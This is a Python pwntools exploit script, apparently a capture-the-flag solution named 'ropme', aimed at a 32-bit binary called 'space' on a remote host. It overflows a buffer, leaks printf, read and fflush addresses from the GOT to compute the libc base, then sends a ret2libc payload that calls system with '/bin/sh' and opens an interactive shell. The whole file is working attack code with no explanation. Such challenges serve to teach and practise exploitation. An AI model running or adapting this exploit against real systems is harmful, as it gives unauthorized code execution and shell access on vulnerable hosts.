#!/usr/bin/python3

'''
    ropme
    @Author: Lorenzo Invidia
    @Requirements: pwntools
'''

# Find libc version
# https://libc.blukat.me/?q=puts%3A690%2Cfgets%3Aad0

from pwn import *
context(os='linux', arch='i386')
#context.log_level = 'debug'

host = '161.35.174.55'
#host = '127.0.0.1'
#port = 8080
port = 30545

e = ELF('./space', checksec=False)
#p = gdb.debug(e.path, '''
#break * 0x080491ce
#continue
#''')
#p = process(e.path)
p = remote(host, port)

system_offset = 0x045420
printf_offset = 0x053de0
fflush_offset = 0x06f130
binsh_offset = 0x18f352
printf = e.symbols['printf']
printf_got = e.got['printf']
read_got = e.got['read']
fflush_got = e.got['fflush']
main = e.symbols['main']

def leak(addr):
    payload = b'B'*14
    payload += p32(0xdeadbeef)  # ebp
    payload += p32(printf)      # eip
    payload += p32(main)        # return    
    payload += p32(addr)        # arg
    
    p.recvuntil('> ')
    p.sendline(payload)
    recv_str = p.recv(4)
    return u32(recv_str.strip())

def exploit(base):
    payload = b'A'*18
    payload += p32(base + system_offset)    
    payload += p32(main)
    payload += p32(base + binsh_offset)
    p.recvuntil('> ')
    p.sendline(payload)
    #raw_input()
    p.interactive()


printf = leak(printf_got)
log.success("got_printf: " + format(hex(printf)))
read = leak(read_got)
log.success("got_read: " + format(hex(read)))

fflush = leak(fflush_got)
log.success("got_fflush: " + format(hex(fflush)))

libc_base = fflush-fflush_offset
log.success("libc_base: " + format(hex(libc_base)))

system = libc_base + system_offset
log.success("system: " + format(hex(system)))
exploit(libc_base)

